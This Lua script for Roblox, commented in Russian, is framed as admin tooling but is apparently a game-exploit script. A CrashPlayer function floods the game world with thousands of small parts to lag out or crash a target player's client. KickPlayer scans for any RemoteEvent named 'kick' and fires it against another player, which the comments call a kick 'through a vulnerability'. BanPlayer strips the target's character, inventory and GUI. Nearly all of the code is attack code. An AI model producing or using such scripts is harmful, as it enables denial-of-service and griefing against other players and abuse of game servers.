-- Метод 1: Перегрузка игрока (краш клиента)
function CrashPlayer(plr)
    spawn(function()
        for i = 1, 100 do
            pcall(function()
                -- Спамим объектами в игрока
                local char = plr.Character
                if char then
                    for _, part in pairs(char:GetChildren()) do
                        if part:IsA("BasePart") then
                            -- Создаём кучу частей внутри
                            for j = 1, 50 do
                                local p = Instance.new("Part")
                                p.Size = Vector3.new(0.1, 0.1, 0.1)
                                p.Position = part.Position
                                p.Anchored = false
                                p.CanCollide = false
                                p.Parent = WS
                            end
                        end
                    end
                end
            end)
            wait(0.05)
        end
    end)
end

-- Метод 2: Прямой кик через уязвимость
function KickPlayer(plr, reason)
    reason = reason or "Кикнут администратором"
    
    -- Способ 1: Через стандартный Kick
    local success = pcall(function()
        plr:Kick(reason)
    end)
    
    if success then
        return true
    end
    
    -- Способ 2: Через RemoteEvent (если найдём)
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name:lower():find("kick") then
            pcall(function()
                v:FireServer(plr, reason)
            end)
            return true
        end
    end
    
    -- Способ 3: Лаг-кик (перегружаем и вылетает)
    CrashPlayer(plr)
    wait(2)
    
    -- Пробуем ещё раз Kick
    pcall(function()
        plr:Kick(reason)
    end)
    
    return true
end

-- Метод 3: Бан (ломка персонажа + кик)
function BanPlayer(plr, reason)
    reason = reason or "Забанен администратором"
    
    -- Ломаем персонажа
    pcall(function()
        if plr.Character then
            -- Удаляем части тела
            for _, v in pairs(plr.Character:GetChildren()) do
                if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
                    v:Destroy()
                end
            end
            
            -- Ломаем Humanoid
            local hum = plr.Character:FindFirstChild("Humanoid")
            if hum then
                hum.Health = 0
                hum.MaxHealth = 0
                hum.WalkSpeed = 0
                hum.JumpPower = 0
            end
            
            -- Закрепляем корневую часть
            local root = plr.Character:FindFirstChild("HumanoidRootPart")
            if root then
                root.Anchored = true
                root.Velocity = Vector3.new(0, 9999, 0)
            end
        end
        
        -- Удаляем инвентарь
        local backpack = plr:FindFirstChild("Backpack")
        if backpack then
            for _, v in pairs(backpack:GetChildren()) do
                v:Destroy()
            end
        end
        
        -- Ломаем PlayerGui
        local pg = plr:FindFirstChild("PlayerGui")
        if pg then
            for _, v in pairs(pg:GetChildren()) do
                v:Destroy()
            end
        end
    end)
    
    -- Кикаем
    wait(0.5)
    pcall(function()
        plr:Kick(reason)
    end)
    
    return true
end

